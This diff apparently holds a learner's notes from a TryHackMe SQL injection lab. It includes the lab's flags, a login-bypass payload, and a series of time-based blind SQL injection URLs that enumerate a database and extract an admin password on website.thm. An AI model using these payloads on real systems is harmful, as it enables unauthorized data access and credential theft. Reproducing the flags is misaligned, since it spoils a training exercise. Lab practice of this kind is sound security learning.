@@ -1,1 +1,32 @@
-THM{SQL_INJECTION_3840}
+Task 5:THM{SQL_INJECTION_3840}
+:pa$$word
+' OR 1=1;--
+admin:3845
+Task 6:THM{SQL_INJECTION_9581}
+Task 7:THM{SQL_INJECTION_1093}
+Task 8:THM{SQL_INJECTION_MASTER}
+Comandos: 
+https://website.thm/analytics?referrer=referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'sqli_four%';--
+
+https://website.thm/analytics?referrer=referrer=admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' AND table_name like 'users%';--
+
+segun yo la base era 'sqli_four%' 
+y una tabla es 'users'
+id, username, password
+INPUT:
+https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(4),2 FROM information_schema.columns where table_schema = 'sqli_four' and table_name = 'users' and COLUMN_NAME like 'password%' and COLUMN_NAME !='id';--
+
+https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(4),2 FROM users where username like 'admin%' ;--
+
+Con este input: **https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(4),2 FROM users where username like 'admin%';--** obtenemos que admin es un usuario valido
+
+https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(4),2 FROM users where username = 'admin' and password like '%';--
+
+https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(4),2 from users where username='admin' and password like '9%';--
+
+referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
+
+
+https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(3),2 FROM users where username='admin' and password like '4961%'; --
+
+https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2 FROM users where username='admin' and password like '4961%'; --
